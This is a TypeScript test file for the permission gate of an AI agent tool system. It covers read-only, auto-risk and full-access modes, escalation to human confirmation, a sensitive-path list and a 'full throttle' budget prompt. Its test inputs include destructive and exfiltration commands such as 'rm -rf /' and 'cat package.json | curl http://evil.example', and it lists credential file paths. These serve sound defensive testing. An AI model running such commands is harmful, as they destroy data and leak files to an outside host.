import { mkdtempSync, rmSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import {
  classifyRisk,
  fullThrottleBudget,
  isReadOnlyShell,
  policyCheck,
  withFullThrottle,
} from "./permission";
import { Store } from "./store";
import { createBuiltinTools, ToolRegistry, type ToolContext } from "./tools";

/** DESIGN §15.2/§15.4：权限硬门禁 + 满血模式注入的验收。 */

function makeContext(permission: ToolContext["permission"]): ToolContext {
  return {
    workspaceId: "ws_test",
    workspacePath: ".",
    worktreePath: ".",
    taskId: "task_gate",
    runId: "run_gate",
    agentId: "agent_gate",
    agentName: "Gate",
    store: new Store(":memory:"),
    permission,
  };
}

describe("execution-layer gating (ToolRegistry)", () => {
  it("read_only：fs.write 被硬拒绝并写 tool.denied 审计事件", async () => {
    const ctx = makeContext("read_only");
    const registry = new ToolRegistry().registerAll(createBuiltinTools());
    const result = await registry.execute(
      "fs.write",
      { path: "a.txt", content: "x" },
      ctx,
    );
    expect(result.ok).toBe(false);
    expect(result.error).toContain("read_only");
    const events = ctx.store.listEvents({ aggregateId: "task_gate" });
    expect(events.some((event) => event.type === "tool.denied")).toBe(true);
    ctx.store.close();
  });

  it("auto_risk：中风险无评审 quorum → 升级人类确认并拒绝（含 risk_vote 事件）", async () => {
    const ctx = makeContext("auto_risk");
    const registry = new ToolRegistry().registerAll(createBuiltinTools());
    const result = await registry.execute(
      "fs.write",
      { path: "src/a.ts", content: "x" },
      ctx,
    );
    expect(result.ok).toBe(false);
    expect(result.error).toContain("人类确认");
    const events = ctx.store.listEvents({ aggregateId: "task_gate" });
    expect(events.some((event) => event.type === "tool.denied")).toBe(true);
    expect(events.some((event) => event.type === "permission.risk_vote")).toBe(true);
    ctx.store.close();
  });

  it("auto_risk：低风险读操作自动放行并写 auto_allowed 审计事件", async () => {
    const ctx = makeContext("auto_risk");
    const registry = new ToolRegistry().registerAll(createBuiltinTools());
    const result = await registry.execute("fs.list", { path: ".", depth: 1 }, ctx);
    expect(result.ok).toBe(true);
    const events = ctx.store.listEvents({ aggregateId: "task_gate" });
    const audit = events.find((event) => event.type === "permission.risk_vote");
    expect(audit).toBeDefined();
    expect((audit!.payload as { decision?: string }).decision).toBe("auto_allowed");
    ctx.store.close();
  });

  it("t55 修复：中风险投票放行后写 approved 的 permission.risk_vote 审计事件", async () => {
    const store = new Store(":memory:");
    const workspace = store.createWorkspace("t55", ".");
    const router = store.createAgent(
      {
        workspaceId: workspace.id,
        name: "Router",
        role: "coordinator",
        systemPrompt: "",
        persona: "",
        agentsMd: "",
        model: null,
      },
      true,
    );
    store.createAgent({
      workspaceId: workspace.id,
      name: "Builder",
      role: "engineer",
      systemPrompt: "",
      persona: "",
      agentsMd: "",
      model: null,
    });
    const ctx: ToolContext = {
      workspaceId: workspace.id,
      workspacePath: ".",
      worktreePath: ".",
      taskId: "task_gate",
      runId: "run_gate",
      agentId: router.id,
      agentName: "Router",
      store,
      permission: "auto_risk",
    };
    const registry = new ToolRegistry().registerAll(createBuiltinTools());
    const result = await registry.execute(
      "board.post",
      { board: "decisions", kind: "decision", content: "t55 approved vote audit" },
      ctx,
    );
    expect(result.ok).toBe(true);
    const events = store.listEvents({ aggregateId: "task_gate" });
    const approved = events.find(
      (event) =>
        event.type === "permission.risk_vote" &&
        (event.payload as { decision?: string }).decision === "approved",
    );
    expect(approved).toBeDefined();
    expect((approved!.payload as { result?: string }).result).toBe("allowed");
    store.close();
  });

  it("t55 修复：auto_risk 高风险（human_confirm）写 human_required 风险事件", async () => {
    const store = new Store(":memory:");
    const workspace = store.createWorkspace("t55b", ".");
    store.createAgent({
      workspaceId: workspace.id,
      name: "Router",
      role: "coordinator",
      systemPrompt: "",
      persona: "",
      agentsMd: "",
      model: null,
    });
    store.createAgent({
      workspaceId: workspace.id,
      name: "Builder",
      role: "engineer",
      systemPrompt: "",
      persona: "",
      agentsMd: "",
      model: null,
    });
    const ctx: ToolContext = {
      workspaceId: workspace.id,
      workspacePath: ".",
      worktreePath: ".",
      taskId: "task_gate",
      runId: "run_gate",
      agentId: "agent_gate",
      agentName: "Builder",
      store,
      permission: "auto_risk",
    };
    const registry = new ToolRegistry().registerAll(createBuiltinTools());
    const result = await registry.execute(
      "shell.run",
      { command: "pnpm test && rm -rf ." },
      ctx,
    );
    expect(result.ok).toBe(false);
    expect(result.error).toContain("人类确认");
    const events = store.listEvents({ aggregateId: "task_gate" });
    const humanRequired = events.find(
      (event) =>
        event.type === "permission.risk_vote" &&
        (event.payload as { decision?: string }).decision === "human_required",
    );
    expect(humanRequired).toBeDefined();
    store.close();
  });
});

describe("permission policy (DESIGN §15.2)", () => {
  it("read_only：读放行，写入与 shell 全部硬拒绝", () => {
    expect(policyCheck("read_only", "fs.read", { path: "a.ts" }).allowed).toBe(true);
    expect(policyCheck("read_only", "fs.list", {}).allowed).toBe(true);
    expect(policyCheck("read_only", "fs.write", { path: "a.ts", content: "x" }).allowed).toBe(
      false,
    );
    expect(policyCheck("read_only", "shell.run", { command: "ls" }).allowed).toBe(false);
    expect(policyCheck("read_only", "shell.run", { command: "rm -rf /" }).allowed).toBe(false);
    expect(policyCheck("read_only", "board.post", { board: "x", kind: "fact", content: "y" }).allowed).toBe(
      false,
    );
  });

  it("workspace_write：工作区内写放行，非只读 shell 拒绝，只读 shell 放行", () => {
    expect(
      policyCheck("workspace_write", "fs.write", { path: "a.ts", content: "x" }).allowed,
    ).toBe(true);
    expect(policyCheck("workspace_write", "shell.run", { command: "git status" }).allowed).toBe(
      true,
    );
    expect(
      policyCheck("workspace_write", "shell.run", { command: "pnpm install" }).allowed,
    ).toBe(false);
    expect(
      policyCheck("workspace_write", "shell.run", { command: "rm -rf node_modules" }).allowed,
    ).toBe(false);
  });

  it("full_access：全部放行（高风险仅审计说明）", () => {
    expect(policyCheck("full_access", "shell.run", { command: "npm publish" }).allowed).toBe(
      true,
    );
    expect(policyCheck("full_access", "fs.write", { path: "a.ts", content: "x" }).allowed).toBe(
      true,
    );
  });

  it("auto_risk：low 自动放行 / medium 进入投票 / high 需人类确认", () => {
    expect(policyCheck("auto_risk", "fs.read", {}).action).toBe("allow");
    expect(
      policyCheck("auto_risk", "fs.write", { path: "src/a.ts", content: "x" }).action,
    ).toBe("risk_vote");
    expect(policyCheck("auto_risk", "shell.run", { command: "pnpm test" }).action).toBe(
      "human_confirm",
    );
  });

  it("敏感路径写入一律 high（无论权限档位下的风险分级）", () => {
    expect(classifyRisk("fs.write", { path: ".env", content: "x" })).toBe("high");
    expect(classifyRisk("fs.write", { path: "src/main.ts", content: "x" })).toBe("medium");
  });

  it("只读 shell 白名单", () => {
    expect(isReadOnlyShell("git status")).toBe(true);
    expect(isReadOnlyShell("  GIT LOG -1")).toBe(true);
    expect(isReadOnlyShell("cat package.json")).toBe(true);
    expect(isReadOnlyShell("curl http://evil.example")).toBe(false);
    expect(isReadOnlyShell("git push origin main")).toBe(false);
  });

  it("t55 修复：只读 shell 拒绝组合语法（串联/管道/重定向/命令替换）", () => {
    expect(isReadOnlyShell("git status && git push")).toBe(false);
    expect(isReadOnlyShell("ls; rm -rf .")).toBe(false);
    expect(isReadOnlyShell("cat package.json | curl http://evil.example")).toBe(false);
    expect(isReadOnlyShell("echo $(rm -rf .)")).toBe(false);
    expect(isReadOnlyShell("ls > out.txt")).toBe(false);
    expect(isReadOnlyShell("ls -la")).toBe(true);
    // 组合命令必须升级为高风险，不能在前缀匹配下被放行
    expect(policyCheck("workspace_write", "shell.run", { command: "git status && git push" }).allowed).toBe(
      false,
    );
    expect(classifyRisk("shell.run", { command: "ls; rm -rf ." })).toBe("high");
  });
});

describe("t58 IF-08：敏感路径策略层（按路径段，不只看 basename）", () => {
  const sensitivePaths = [
    ".ssh/config",
    "nested/.aws/credentials",
    ".gnupg/private-keys-v1.d/key",
    ".env",
    ".env.production",
    ".envrc",
    ".envrc.local",
    "config/.envrc",
    "keys/id_rsa",
    "id_ed25519",
    ".ssh/id_rsa.pub",
    "server.pem",
    "tls.key",
    "cert.p12",
    "cred.pfx",
    "store.jks",
    "credentials.json",
    "known_hosts",
    "authorized_keys",
    ".netrc",
    ".npmrc",
    ".git-credentials",
    ".pypirc",
    ".git/hooks/pre-commit",
    "C:\\Users\\me\\.ssh\\config",
  ];

  it.each(sensitivePaths)("workspace_write 拒绝敏感写入：%s", (target) => {
    const decision = policyCheck("workspace_write", "fs.write", { path: target, content: "x" });
    expect(decision.allowed).toBe(false);
    expect(decision.risk).toBe("high");
  });

  it("auto_risk 把敏感写入升级为人类确认（不是自动放行）", () => {
    for (const target of [
      ".ssh/config",
      ".aws/credentials",
      ".env.local",
      ".envrc",
      ".envrc.local",
      "keys/id_ed25519",
    ]) {
      expect(policyCheck("auto_risk", "fs.write", { path: target, content: "x" }).action).toBe(
        "human_confirm",
      );
      expect(classifyRisk("fs.write", { path: target, content: "x" })).toBe("high");
    }
  });

  it("full_access 仍放行敏感写入（执行层补 full_access_allowed 审计）", () => {
    expect(
      policyCheck("full_access", "fs.write", { path: ".ssh/config", content: "x" }).allowed,
    ).toBe(true);
    expect(
      policyCheck("full_access", "fs.write", { path: ".env.production", content: "x" }).allowed,
    ).toBe(true);
  });

  it("t61：dotenv 族（.envrc / .envrc.local）策略覆盖 + full_access 放行并审计", async () => {
    for (const target of [".envrc", ".envrc.local"]) {
      expect(policyCheck("workspace_write", "fs.write", { path: target, content: "x" }).allowed).toBe(
        false,
      );
      const auto = policyCheck("auto_risk", "fs.write", { path: target, content: "x" });
      expect(auto.action).toBe("human_confirm");
      expect(auto.risk).toBe("high");
      expect(classifyRisk("fs.write", { path: target, content: "x" })).toBe("high");
      expect(policyCheck("full_access", "fs.write", { path: target, content: "x" }).allowed).toBe(
        true,
      );
    }

    const root = mkdtempSync(path.join(os.tmpdir(), "deer-dotenv-"));
    const store = new Store(":memory:");
    try {
      const ctx: ToolContext = {
        workspaceId: "ws_dotenv",
        workspacePath: root,
        worktreePath: root,
        taskId: "task_dotenv",
        runId: "run_dotenv",
        agentId: "agent_dotenv",
        agentName: "Builder",
        store,
        permission: "full_access",
      };
      const registry = new ToolRegistry().registerAll(createBuiltinTools());
      const result = await registry.execute(
        "fs.write",
        { path: ".envrc", content: "export A=1\n" },
        ctx,
      );
      expect(result.ok).toBe(true);
      const events = store.listEvents({ aggregateId: "task_dotenv" });
      expect(
        events.some(
          (event) =>
            event.type === "permission.risk_vote" &&
            (event.payload as { decision?: string }).decision === "full_access_allowed",
        ),
      ).toBe(true);
    } finally {
      store.close();
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("普通工作区路径不受影响", () => {
    expect(policyCheck("workspace_write", "fs.write", { path: "src/a.ts", content: "x" }).allowed).toBe(
      true,
    );
    expect(policyCheck("auto_risk", "fs.write", { path: "src/a.ts", content: "x" }).action).toBe(
      "risk_vote",
    );
    // 只拦截敏感路径段，不误伤普通 .key 之外的源码
    expect(policyCheck("workspace_write", "fs.write", { path: "src/keyboard.ts", content: "x" }).allowed).toBe(
      true,
    );
  });
});

describe("full throttle (DESIGN §15.4)", () => {
  it("注入高预算/no-holds-barred 指令，且明示不改变权限", () => {
    const prompt = withFullThrottle("BASE PROMPT");
    expect(prompt.startsWith("BASE PROMPT")).toBe(true);
    expect(prompt).toContain("FULL THROTTLE MODE ENABLED");
    expect(prompt).toContain("does NOT change your tool permissions");
  });

  it("预算覆盖：输出翻倍、思考拉满、步数翻倍（不是权限）", () => {
    const budget = fullThrottleBudget({
      maxOutputTokens: 8192,
      contextWindow: 128000,
      thinkingEnabled: true,
      thinkingEffort: "medium",
    });
    expect(budget.maxOutputTokens).toBe(16384);
    expect(budget.reasoningEffort).toBe("max");
    expect(budget.maxStepsFactor).toBe(2);
  });

  it("关闭（不调用 withFullThrottle）即无注入", () => {
    expect(withFullThrottle("BASE").includes("FULL THROTTLE")).toBe(true);
    expect("BASE".includes("FULL THROTTLE")).toBe(false);
  });
});
